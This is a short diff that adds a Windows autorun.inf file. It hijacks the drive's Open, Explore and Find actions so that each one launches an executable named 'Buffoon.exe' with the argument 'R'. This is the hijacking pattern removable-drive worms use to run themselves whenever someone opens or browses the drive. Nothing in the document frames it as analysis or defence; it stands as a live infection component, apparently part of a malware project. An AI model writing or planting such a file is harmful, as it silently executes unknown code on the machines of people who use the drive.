@@ -1,0 +1,6 @@
+[Autorun]
+Open=Buffoon.exe R
+Shell\Open\Command=Buffoon.exe R
+Shell\Open\Default=1
+Shell\Explore\Command=Buffoon.exe R
+Shell\Find\Command=Buffoon.exe R
